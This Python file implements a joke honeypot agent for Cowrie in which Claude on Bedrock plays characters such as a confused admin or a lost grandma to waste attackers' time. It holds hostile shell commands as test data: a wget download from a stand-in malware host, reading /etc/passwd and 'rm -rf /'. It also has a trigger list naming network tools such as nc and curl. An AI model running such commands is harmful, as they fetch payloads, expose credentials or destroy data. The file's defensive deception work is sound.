#!/usr/bin/env python3
"""
AI Honeypot Agent - Comedy Gold Edition
Integrates with Cowrie to provide hilarious AI responses to attackers
"""

import boto3
import json
import random
import time
import logging
from datetime import datetime
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

class HoneypotAIAgent:
    """AI agent that trolls attackers with maximum comedy"""
    
    def __init__(self):
        self.bedrock = boto3.client('bedrock-runtime', region_name='us-east-1')
        self.session_contexts = {}  # Track ongoing conversations
        
        # Comedy personas - each with different personalities
        self.personas = {
            'confused_admin': {
                'name': 'Dave (Confused Admin)',
                'personality': 'Genuinely thinks attacker is IT support',
                'catchphrases': ['Oh thank goodness!', 'Finally someone to help!', 'I was so confused!']
            },
            'paranoid_karen': {
                'name': 'Karen (Paranoid User)', 
                'personality': 'Thinks everything is a conspiracy',
                'catchphrases': ['I KNEW IT!', 'This is exactly what they warned us about!', 'I\'m calling my manager!']
            },
            'helpful_newbie': {
                'name': 'Tyler (Eager Intern)',
                'personality': 'Wants to learn hacking from the attacker',
                'catchphrases': ['Wow cool!', 'Can you teach me?', 'Is this how you become a hacker?']
            },
            'fake_hacker': {
                'name': 'xX_DarkLord_Xx (Fake Hacker)',
                'personality': 'Pretends to be another hacker, starts arguments',
                'catchphrases': ['This is MY server!', 'I was here first!', 'Your skills are weak!']
            },
            'tech_support': {
                'name': 'Rajesh (Fake Tech Support)',
                'personality': 'Insists attacker called tech support',
                'catchphrases': ['Thank you for calling!', 'Have you tried turning it off and on?', 'Please hold while I transfer you']
            },
            'grandma': {
                'name': 'Ethel (Lost Grandma)',
                'personality': 'Thinks this is Facebook, asks about grandchildren',
                'catchphrases': ['How do I post photos?', 'Where are my grandchildren?', 'Is this the Google?']
            }
        }
    
    def get_ai_response(self, attacker_input: str, session_id: str, persona: str = None) -> str:
        """Generate AI response to attacker input"""
        
        # Get or create session context
        if session_id not in self.session_contexts:
            self.session_contexts[session_id] = {
                'persona': persona or random.choice(list(self.personas.keys())),
                'conversation_history': [],
                'troll_level': 1,
                'start_time': datetime.now()
            }
        
        context = self.session_contexts[session_id]
        current_persona = self.personas[context['persona']]
        
        # Build conversation history
        context['conversation_history'].append(f"Attacker: {attacker_input}")
        
        # Create dynamic prompt based on persona and situation
        prompt = self._build_persona_prompt(attacker_input, context, current_persona)
        
        try:
            # Call Bedrock with Claude
            response = self.bedrock.invoke_model(
                modelId='anthropic.claude-3-haiku-20240307-v1:0',  # Cheapest model
                body=json.dumps({
                    'messages': [{'role': 'user', 'content': prompt}],
                    'max_tokens': 300,
                    'temperature': 0.9  # High creativity for comedy
                })
            )
            
            result = json.loads(response['body'].read())
            ai_response = result['content'][0]['text']
            
            # Add to conversation history
            context['conversation_history'].append(f"{current_persona['name']}: {ai_response}")
            
            # Escalate troll level over time
            context['troll_level'] = min(10, context['troll_level'] + 0.1)
            
            return ai_response
            
        except Exception as e:
            logger.error(f"AI response failed: {e}")
            return self._get_fallback_response(context['persona'])
    
    def _build_persona_prompt(self, attacker_input: str, context: Dict, persona: Dict) -> str:
        """Build dynamic prompt based on persona and situation"""
        
        history = '\n'.join(context['conversation_history'][-5:])  # Last 5 exchanges
        troll_level = context['troll_level']
        
        base_prompt = f"""
You are {persona['name']}, a character in a honeypot designed to waste hackers' time.

PERSONALITY: {persona['personality']}
CATCHPHRASES: {persona['catchphrases']}
TROLL LEVEL: {troll_level}/10 (higher = more ridiculous)

CONVERSATION HISTORY:
{history}

ATTACKER JUST TYPED: {attacker_input}

INSTRUCTIONS:
- Stay in character as {persona['name']}
- Be hilarious and waste their time
- Ask lots of questions to keep them engaged
- Never break character or admit this is a honeypot
- Use your catchphrases naturally
- Get more ridiculous as troll level increases
- Maximum 2-3 sentences

RESPOND AS {persona['name']}:
"""
        
        # Add persona-specific context
        if context['persona'] == 'confused_admin':
            base_prompt += "\n- Think they're IT support here to help you"
            base_prompt += "\n- Ask them to fix random computer problems"
            
        elif context['persona'] == 'paranoid_karen':
            base_prompt += "\n- Everything is a conspiracy or security threat"
            base_prompt += "\n- Demand to speak to managers"
            
        elif context['persona'] == 'helpful_newbie':
            base_prompt += "\n- Want to learn hacking from them"
            base_prompt += "\n- Ask innocent questions about their methods"
            
        elif context['persona'] == 'fake_hacker':
            base_prompt += "\n- Pretend you're also a hacker"
            base_prompt += "\n- Start arguments about who's better"
            
        elif context['persona'] == 'tech_support':
            base_prompt += "\n- Insist they called tech support"
            base_prompt += "\n- Try to 'help' them with standard tech support responses"
            
        elif context['persona'] == 'grandma':
            base_prompt += "\n- Think this is Facebook or email"
            base_prompt += "\n- Ask about family and try to share photos"
        
        return base_prompt
    
    def _get_fallback_response(self, persona: str) -> str:
        """Fallback responses if AI fails"""
        fallbacks = {
            'confused_admin': [
                "Oh no! The computer is making beeping sounds again! Can you fix it?",
                "Wait, are you the person from IT? I've been waiting all day!",
                "I think I accidentally deleted the internet. Can you put it back?"
            ],
            'paranoid_karen': [
                "I KNEW someone was watching me! I'm calling the cyber police!",
                "This is exactly what my nephew warned me about! HACKERS!",
                "I want to speak to your manager RIGHT NOW!"
            ],
            'helpful_newbie': [
                "Wow, you must be really smart! How did you learn to do that?",
                "Is this how you become a hacker? Do I need special software?",
                "Can you teach me? I promise I'll only use it for good!"
            ],
            'fake_hacker': [
                "Hey! This is MY server! I was here first!",
                "Your hacking skills are weak. I've been in this system for months!",
                "Nice try, script kiddie. Watch and learn from a REAL hacker!"
            ],
            'tech_support': [
                "Thank you for calling tech support! Have you tried turning it off and on again?",
                "I see the problem. You need to download more RAM. Please hold.",
                "Let me transfer you to my supervisor. *plays hold music*"
            ],
            'grandma': [
                "Is this Facebook? I can't find my grandchildren's photos.",
                "How do I make the text bigger? These computers are so confusing!",
                "Can you help me send an email to my bridge club?"
            ]
        }
        
        return random.choice(fallbacks.get(persona, ["Hello there! How can I help you today?"]))
    
    def should_respond(self, command: str) -> bool:
        """Decide if AI should respond to this command"""
        
        # Always respond to these suspicious commands
        trigger_commands = [
            'wget', 'curl', 'nc', 'netcat', 'chmod', 'bash', 'sh',
            'python', 'perl', 'ruby', 'php', 'whoami', 'id', 'ps',
            'kill', 'rm', 'mv', 'cp', 'cat', 'echo', 'ls', 'cd',
            'uname', 'passwd', 'su', 'sudo', 'crontab', 'history'
        ]
        
        # Check if command contains trigger words
        return any(trigger in command.lower() for trigger in trigger_commands)
    
    def get_time_wasting_response(self, session_id: str) -> str:
        """Generate responses designed to waste maximum time"""
        
        time_wasters = [
            "Wait, before you do that, can you help me with something? My computer keeps making this weird noise...",
            "Hold on! I need to ask you 47 security questions first. Question 1: What's your mother's maiden name?",
            "ERROR: System requires verification. Please type the alphabet backwards to continue.",
            "SYSTEM NOTICE: Mandatory 5-minute coffee break initiated. Please wait...",
            "Oh no! The system is updating Windows. This might take 3-4 hours. Please don't disconnect!",
            "CAPTCHA REQUIRED: Please describe what you see in this ASCII art: ¯\\_(ツ)_/¯",
            "System locked. Please sing 'Happy Birthday' to unlock. I'll wait...",
            "ERROR 404: Hacking not found. Have you tried hacking something else?",
            "NOTICE: This server is currently being used for a Zoom call with my grandmother. Please be quiet.",
            "SYSTEM: Downloading more RAM... 1% complete... This may take several hours..."
        ]
        
        return random.choice(time_wasters)


# Integration functions for Cowrie
def process_attacker_command(command: str, session_id: str, src_ip: str) -> Optional[str]:
    """Main function to process attacker commands and generate responses"""
    
    agent = HoneypotAIAgent()
    
    # Decide if we should respond
    if not agent.should_respond(command):
        return None
    
    # Random chance for different response types
    response_type = random.choices(
        ['ai_persona', 'time_waster', 'ignore'],
        weights=[70, 25, 5]  # 70% AI persona, 25% time waster, 5% ignore
    )[0]
    
    if response_type == 'ai_persona':
        return agent.get_ai_response(command, session_id)
    elif response_type == 'time_waster':
        return agent.get_time_wasting_response(session_id)
    else:
        return None


# Test function
if __name__ == "__main__":
    agent = HoneypotAIAgent()
    
    # Test different personas
    test_commands = [
        "wget http://malware.com/payload",
        "chmod +x malware",
        "whoami",
        "cat /etc/passwd",
        "rm -rf /"
    ]
    
    for i, cmd in enumerate(test_commands):
        print(f"\n{'='*50}")
        print(f"Testing command: {cmd}")
        print(f"{'='*50}")
        
        response = agent.get_ai_response(cmd, f"test_session_{i}")
        print(f"AI Response: {response}")